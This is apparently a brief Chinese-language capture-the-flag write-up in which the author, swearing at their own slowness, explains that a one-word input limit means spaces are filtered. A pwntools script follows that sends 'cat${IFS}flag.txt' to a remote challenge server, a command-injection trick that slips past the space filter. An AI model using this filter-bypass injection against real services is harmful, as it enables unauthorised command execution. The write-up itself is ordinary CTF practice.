好蠢啊wc，这个题只能限制输入一个word的意思就是过滤了空格，妈的直接绕空格就行了，原本应该是很熟练的

```python
from pwn import *
context.log_level = 'debug'
# 创建远程连接
p = remote('184.72.87.9','8008')
p.recv()
p.sendline("cat${IFS}flag.txt")
p.recv()
```

